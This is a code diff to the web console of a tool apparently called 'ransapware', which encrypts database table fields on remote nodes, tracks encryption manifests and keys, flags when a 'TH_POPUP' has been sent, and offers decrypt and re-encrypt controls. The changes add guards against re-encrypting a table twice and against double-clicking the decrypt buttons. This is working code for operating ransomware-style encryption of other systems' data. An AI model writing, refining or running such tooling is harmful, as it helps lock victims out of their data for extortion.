@@ -10562,9 +10562,26 @@ async function rwFetchFields(sid) {
   if (!table) { showToast('Enter a table name', 'error'); return; }
   const fSection = document.getElementById('rw-fields-section');
   const fList = document.getElementById('rw-fields-list');
+  const encBtn = document.getElementById('rw-encrypt-btn');
   fList.innerHTML = '<div style="color:#8b949e;padding:8px">Fetching metadata...</div>';
   fSection.style.display = 'block';
+  if (encBtn) { encBtn.disabled = true; encBtn.style.opacity = '0.5'; }
   try {
+    // Check for active encryption on this table
+    let manifests = [];
+    try {
+      manifests = await api('GET', 'node/' + sid + '/ransapware/manifests');
+      if (!Array.isArray(manifests)) manifests = [];
+    } catch (_) {}
+    const activeOnTable = manifests.filter(m =>
+      m.table === table && !m.decrypted && m.rows_encrypted > 0);
+    if (activeOnTable.length) {
+      fList.innerHTML = '<div style="color:#f85149;padding:8px">'
+        + '&#9888; Table ' + escHtml(table) + ' already has an active encryption ('
+        + activeOnTable[0].rows_encrypted + ' rows). Decrypt it first before re-encrypting.</div>';
+      if (encBtn) { encBtn.disabled = true; encBtn.style.opacity = '0.5'; }
+      return;
+    }
     const r = await api('POST', 'node/' + sid + '/ransapware/fields', {table});
     if (r.error) { fList.innerHTML = '<div style="color:#f85149">' + escHtml(r.error) + '</div>'; return; }
     const eligible = (r.fields || []).filter(f => f.eligible);
@@ -10591,6 +10608,7 @@ async function rwFetchFields(sid) {
         + '<td style="padding:3px 6px;color:#8b949e;font-size:11px">' + escHtml(f.description) + '</td></tr>'
       ).join('')
       + '</tbody></table>';
+    if (encBtn) { encBtn.disabled = false; encBtn.style.opacity = '1'; }
   } catch (e) {
     fList.innerHTML = '<div style="color:#f85149">Error: ' + escHtml(String(e)) + '</div>';
   }
@@ -10663,9 +10681,9 @@ async function showRansapwareDecryptModal(sid) {
         FM: ${escHtml(m.fm_name || '?')}
         ${m.popup_sent ? ' &middot; <span style="color:#d29922">TH_POPUP sent</span>' : ''}
       </div>
-      ${!m.decrypted ? `<button class="btn" style="margin-top:8px;background:#238636;border:1px solid #2ea043;color:#fff;padding:4px 14px;font-size:12px;border-radius:4px;cursor:pointer"
+      ${!m.decrypted ? `<button class="btn" data-rw-action="decrypt" style="margin-top:8px;background:#238636;border:1px solid #2ea043;color:#fff;padding:4px 14px;font-size:12px;border-radius:4px;cursor:pointer"
         onclick="rwDecrypt('${escHtml(sid)}', '${escHtml(m.path)}', false)">&#128275; Decrypt (Restore)</button>` : ''}
-      ${m.decrypted ? `<button class="btn" style="margin-top:8px;background:#d29922;border:1px solid #e3b341;color:#fff;padding:4px 14px;font-size:12px;border-radius:4px;cursor:pointer"
+      ${m.decrypted ? `<button class="btn" data-rw-action="undo" style="margin-top:8px;background:#d29922;border:1px solid #e3b341;color:#fff;padding:4px 14px;font-size:12px;border-radius:4px;cursor:pointer"
         onclick="rwDecrypt('${escHtml(sid)}', '${escHtml(m.path)}', true)">&#9888; Undo decrypt (re-encrypt with this key)</button>` : ''}
     </div>`;
   };
@@ -10680,11 +10698,16 @@ async function showRansapwareDecryptModal(sid) {
   panel.classList.add('visible');
 }
 
-async function rwDecrypt(sid, manifestPath, reverse) {
+async function rwDecrypt(sid, manifestPath, reverse, evt) {
   const msg = reverse
     ? 'RECOVERY: This will RE-ENCRYPT the data using the manifest key to undo an erroneous decrypt.\\n\\nContinue?'
     : 'Decrypt and restore the table data?';
   if (!confirm(msg)) return;
+  // Disable all decrypt/undo buttons to prevent double-click
+  document.querySelectorAll('[data-rw-action]').forEach(b => {
+    b.disabled = true; b.style.opacity = '0.5';
+    b.textContent = reverse ? 'Re-encrypting...' : 'Decrypting...';
+  });
   await api('POST', 'node/' + sid + '/ransapware/decrypt', {
     manifest_path: manifestPath, reverse: !!reverse
   });
